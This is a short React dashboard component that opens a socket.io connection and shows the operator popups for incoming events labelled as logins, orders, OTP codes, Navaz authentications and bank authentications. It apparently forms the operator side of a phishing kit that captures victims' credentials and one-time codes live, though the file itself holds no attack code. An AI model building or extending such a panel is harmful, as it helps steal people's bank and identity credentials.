import React, { useEffect, useState } from 'react'
import { serverRoute, token } from './App'
import { io } from 'socket.io-client'
import Alret from './Alret'
import Order from './Order'
const Main = () => {
    const socket = io(serverRoute);
    const [data,setData] = useState([])
    const [popup,setPopup] = useState(false)

    socket.on('newLogin',(result)=>{
      setData([{...result,mode:'request'},...data])
      setPopup(true)
    })
    socket.on('newOrder',(result)=>{
      setData([{...result,mode:'order'},...data])
      setPopup(true)
    })

    socket.on('orderOtp',(result)=>{
      setData([{...result,mode:'otp'},...data])
      setPopup(true)
    })

    socket.on('newNavaz',(result)=>{
        console.log(result)
      setData([{...result,mode:'navaz'},...data])
      setPopup(true)
    })
    useEffect(()=>{
        if(!token){
            window.location.href = '/login'
        }
    },[])

    socket.on('bankAuth',(result)=>{
      setData([{...result,mode:'bankAuth'},...data])
      setPopup(true)
    })
    const [active,setActive] = useState({nav:'',data:{}})
  return (
    <div className='flex w-full flex-col bg-gray-200 relative h-screen' dir='rtl'  >
        <div className='flex items-center justify-center w-full bg-white py-2' >
          <img src='/individual 1.png' className='w-20 h-20'/>
        </div>
        <div className='flex '>
          {popup && <Alret data={data} setPopup = {setPopup}  setData = {setData} socket= {socket} setActive={setActive}  />}
          {active.nav==='OrderData' && <Order setActive={setActive} data={active.data} socket={socket} />}
        </div>

    </div>
  )
}

export default Main
